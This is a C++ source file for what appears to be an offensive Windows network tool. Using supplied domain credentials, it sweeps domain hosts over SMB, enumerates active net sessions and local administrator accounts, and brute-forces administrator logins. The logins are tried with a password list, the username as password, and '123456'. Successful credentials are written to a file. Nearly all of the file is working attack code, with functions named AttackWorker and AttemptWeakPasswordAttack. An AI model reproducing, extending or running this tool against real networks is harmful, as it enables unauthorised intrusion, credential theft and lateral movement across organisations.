#include "MultiThread.h"
#include <iostream>

// Global mutex for thread synchronization
std::mutex g_mutex;

// Constructor
MultiThread::MultiThread(
    LPWSTR domainUserName,
    LPWSTR domainPassword,
    const std::vector<std::wstring>& passwordList,
    HANDLE aliveFile,
    HANDLE localFile,
    HANDLE successFile,
    HANDLE netSessionsFile)
    : m_domainUserName(domainUserName)
    , m_domainPassword(domainPassword)
    , m_passwordList(passwordList)
    , m_aliveFile(aliveFile)
    , m_localFile(localFile)
    , m_successFile(successFile)
    , m_netSessionsFile(netSessionsFile)
    , m_domainName(L"")
    , m_userName(L"")
{
    // Initialize Winsock
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0)
    {
        fprintf(stderr, "[Error] WSAStartup failed: %d\n", result);
    }

    // Parse domain and username
    ParseDomainAndUsername();
}

// Destructor
MultiThread::~MultiThread()
{
    WSACleanup();
}

// Parse domain and username from domain\username format
void MultiThread::ParseDomainAndUsername()
{
    if (!m_domainUserName)
    {
        return;
    }

    std::wstring fullName(m_domainUserName);
    size_t separatorPos = fullName.find(L'\\');
    
    if (separatorPos != std::wstring::npos)
    {
        m_domainName = fullName.substr(0, separatorPos);
        m_userName = fullName.substr(separatorPos + 1);
    }
}

// Save alive host information to file
bool MultiThread::SaveAliveHost(LPCWSTR computerName, LPCWSTR ipAddress)
{
    if (!computerName || !ipAddress)
    {
        return false;
    }

    wchar_t buffer[MAX_PATH];
    HRESULT hr = StringCchPrintfW(
        buffer,
        MAX_PATH,
        L"[%s] %s\n",
        computerName,
        ipAddress
    );

    if (FAILED(hr))
    {
        return false;
    }

    return m_commonApi.WriteFileApi(m_aliveFile, buffer);
}

// Save local administrator information to file
bool MultiThread::SaveLocalAdministrator(LPCWSTR computerName, const std::wstring& administratorName)
{
    if (!computerName || administratorName.empty())
    {
        return false;
    }

    wchar_t buffer[MAX_PATH];
    HRESULT hr = StringCchPrintfW(
        buffer,
        MAX_PATH,
        L"[%s] %s\n",
        computerName,
        administratorName.c_str()
    );

    if (FAILED(hr))
    {
        return false;
    }

    return m_commonApi.WriteFileApi(m_localFile, buffer);
}

// Save network session information to file
bool MultiThread::SaveNetworkSession(LPCWSTR computerName, LPSESSION_INFO_10 sessionInfo)
{
    if (!computerName || !sessionInfo)
    {
        return false;
    }

    wchar_t buffer[MAX_PATH];
    HRESULT hr = StringCchPrintfW(
        buffer,
        MAX_PATH,
        L"Server: %s\tClient: %s\tUser: %s\tActive: %d\n",
        computerName,
        sessionInfo->sesi10_cname,
        sessionInfo->sesi10_username,
        sessionInfo->sesi10_time
    );

    if (FAILED(hr))
    {
        return false;
    }

    return m_commonApi.WriteFileApi(m_netSessionsFile, buffer);
}

// Thread worker function - processes hosts from the list
void MultiThread::AttackWorker(int threadId, std::vector<std::wstring>* hostList)
{
    if (!hostList)
    {
        return;
    }

    while (true)
    {
        std::wstring computerName;

        // Thread-safe host retrieval
        {
            std::lock_guard<std::mutex> lock(g_mutex);
            
            if (hostList->empty())
            {
                break;
            }

            computerName = hostList->back();
            hostList->pop_back();
        }

        ProcessHost(threadId, computerName.c_str());
    }
}

// Process a single host
void MultiThread::ProcessHost(int threadId, LPCWSTR computerName)
{
    if (!computerName)
    {
        return;
    }

    // Rate limiting
    Sleep(1000);

    // Resolve hostname to IP address
    auto ipConversion = m_commonApi.UnicodeToAnsi(computerName);
    if (!ipConversion)
    {
        wprintf(L"[#%d] Failed to convert hostname: %s\n", threadId, computerName);
        return;
    }

    struct hostent* remoteHost = gethostbyname(ipConversion.get());
    if (!remoteHost)
    {
        wprintf(L"[#%d] gethostbyname failed for %s, error: %d\n", 
                threadId, computerName, GetLastError());
        return;
    }

    if (remoteHost->h_addrtype != AF_INET)
    {
        return;
    }

    // Process each IP address
    ProcessHostIpAddresses(threadId, computerName, remoteHost);
}

// Process all IP addresses for a host
void MultiThread::ProcessHostIpAddresses(int threadId, LPCWSTR computerName, struct hostent* remoteHost)
{
    int ipIndex = 0;
    
    while (remoteHost->h_addr_list[ipIndex] != nullptr)
    {
        struct in_addr addr;
        addr.s_addr = *reinterpret_cast<u_long*>(remoteHost->h_addr_list[ipIndex++]);
        
        auto ipAddress = m_commonApi.AnsiToUnicode(inet_ntoa(addr));
        if (!ipAddress)
        {
            continue;
        }

        if (ProcessSingleIpAddress(threadId, computerName, ipAddress.get()))
        {
            break; // Successfully compromised, move to next host
        }
    }
}

// Process a single IP address
bool MultiThread::ProcessSingleIpAddress(int threadId, LPCWSTR computerName, LPCWSTR ipAddress)
{
    // Check if host is alive
    if (!m_wnetApi.DetectAlive(threadId, ipAddress, computerName))
    {
        return false;
    }

    SaveAliveHost(computerName, ipAddress);

    // Build UNC path
    std::wstring uncPath = L"\\\\" + std::wstring(ipAddress);
    LPWSTR uncPathPtr = const_cast<LPWSTR>(uncPath.c_str());

    // Try to connect with domain credentials
    if (!m_wnetApi.ConnectToShare(uncPathPtr, m_domainUserName, m_domainPassword))
    {
        return false;
    }

    // Get network sessions
    GetNetworkSessions(threadId, computerName, uncPathPtr);

    // Get local administrators
    std::vector<std::wstring> administrators = m_wnetApi.GetLocalGroupMembers(uncPathPtr);

    // Disconnect before attempting authentication
    m_wnetApi.DisconnectFromShare(uncPathPtr);

    // Attempt weak password attack
    return AttemptWeakPasswordAttack(threadId, computerName, administrators);
}

// Get network sessions for a host
void MultiThread::GetNetworkSessions(int threadId, LPCWSTR computerName, LPWSTR uncPath)
{
    std::vector<LPSESSION_INFO_10> sessions = m_wnetApi.EnumerateNetworkSessions(uncPath);
    
    if (sessions.size() <= 1)
    {
        return;
    }

    wprintf(L"[#%d] %s net sessions: %zu\n", threadId, uncPath, sessions.size());

    for (auto sessionInfo : sessions)
    {
        wprintf(L"[#%d] Server: %s\tClient: %s\tUser: %s\tActive: %d\n",
                threadId,
                computerName,
                sessionInfo->sesi10_cname,
                sessionInfo->sesi10_username,
                sessionInfo->sesi10_time);

        SaveNetworkSession(computerName, sessionInfo);
        NetApiBufferFree(sessionInfo);
    }
}

// Attempt weak password attack against administrators
bool MultiThread::AttemptWeakPasswordAttack(
    int threadId,
    LPCWSTR computerName,
    const std::vector<std::wstring>& administrators)
{
    std::wstring uncPath = L"\\\\" + std::wstring(computerName);
    LPWSTR uncPathPtr = const_cast<LPWSTR>(uncPath.c_str());

    for (const auto& administrator : administrators)
    {
        wprintf(L"-> %s\n", administrator.c_str());
        SaveLocalAdministrator(computerName, administrator);

        // Parse domain\username
        size_t separatorPos = administrator.find(L'\\');
        if (separatorPos == std::wstring::npos)
        {
            continue;
        }

        std::wstring hostName = administrator.substr(0, separatorPos);
        std::wstring adminUserName = administrator.substr(separatorPos + 1);

        if (ProcessAdministratorAccount(
                threadId,
                computerName,
                uncPathPtr,
                hostName,
                adminUserName,
                administrator))
        {
            return true;
        }
    }

    return false;
}

// Process individual administrator account
bool MultiThread::ProcessAdministratorAccount(
    int threadId,
    LPCWSTR computerName,
    LPWSTR uncPath,
    const std::wstring& hostName,
    const std::wstring& adminUserName,
    const std::wstring& fullAdminName)
{
    LPWSTR fullAdminNamePtr = const_cast<LPWSTR>(fullAdminName.c_str());

    // Check if it's a domain account
    if (_wcsicmp(hostName.c_str(), m_domainName.c_str()) == 0)
    {
        return ProcessDomainAccount(
            threadId,
            uncPath,
            fullAdminNamePtr,
            adminUserName);
    }
    else
    {
        return ProcessLocalAccount(
            threadId,
            uncPath,
            fullAdminNamePtr,
            adminUserName);
    }
}

// Process domain administrator account
bool MultiThread::ProcessDomainAccount(
    int threadId,
    LPWSTR uncPath,
    LPWSTR fullAdminName,
    const std::wstring& adminUserName)
{
    // Skip Domain Admins group
    if (_wcsicmp(adminUserName.c_str(), L"Domain Admins") == 0)
    {
        return false;
    }

    // Handle Domain Users group
    if (_wcsicmp(adminUserName.c_str(), L"Domain Users") == 0)
    {
        wprintf(L"[#%d] Domain Users found: %s\n", threadId, adminUserName.c_str());
        m_commonApi.SaveIPCSuccess(m_successFile, uncPath, m_domainUserName, m_domainPassword);
        return false;
    }

    // Check if it's the current domain user
    if (_wcsicmp(adminUserName.c_str(), m_userName.c_str()) == 0)
    {
        if (m_wnetApi.ConnectToShare(uncPath, fullAdminName, m_domainPassword))
        {
            m_commonApi.SaveIPCSuccess(m_successFile, uncPath, fullAdminName, m_domainPassword);
            return false;
        }
        else
        {
            wprintf(L"[#%d] [Fail] net use %s /u:%s %s\n",
                    threadId, uncPath, fullAdminName, m_domainPassword);
        }
    }

    return false;
}

// Process local administrator account
bool MultiThread::ProcessLocalAccount(
    int threadId,
    LPWSTR uncPath,
    LPWSTR fullAdminName,
    const std::wstring& adminUserName)
{
    // Handle Administrator account
    if (_wcsicmp(adminUserName.c_str(), L"Administrator") == 0)
    {
        return TryPasswordList(threadId, uncPath, fullAdminName);
    }

    // Try username as password
    LPWSTR userNameAsPassword = const_cast<LPWSTR>(adminUserName.c_str());
    if (m_wnetApi.ConnectToShare(uncPath, fullAdminName, userNameAsPassword))
    {
        m_commonApi.SaveIPCSuccess(m_successFile, uncPath, fullAdminName, userNameAsPassword);
        return false;
    }

    // Try common password "123456"
    if (m_wnetApi.ConnectToShare(uncPath, fullAdminName, L"123456"))
    {
        m_commonApi.SaveIPCSuccess(m_successFile, uncPath, fullAdminName, L"123456");
        return false;
    }

    wprintf(L"[#%d] [Fail] net use %s /u:%s %s\n",
            threadId, uncPath, fullAdminName, adminUserName.c_str());

    return false;
}

// Try passwords from the password list
bool MultiThread::TryPasswordList(int threadId, LPWSTR uncPath, LPWSTR fullAdminName)
{
    for (const auto& password : m_passwordList)
    {
        LPWSTR passwordPtr = const_cast<LPWSTR>(password.c_str());
        
        if (m_wnetApi.ConnectToShare(uncPath, fullAdminName, passwordPtr))
        {
            m_commonApi.SaveIPCSuccess(m_successFile, uncPath, fullAdminName, passwordPtr);
            return false;
        }
        else
        {
            wprintf(L"[#%d] [Fail] net use %s /u:%s %s\n",
                    threadId, uncPath, fullAdminName, passwordPtr);
        }
    }

    return false;
}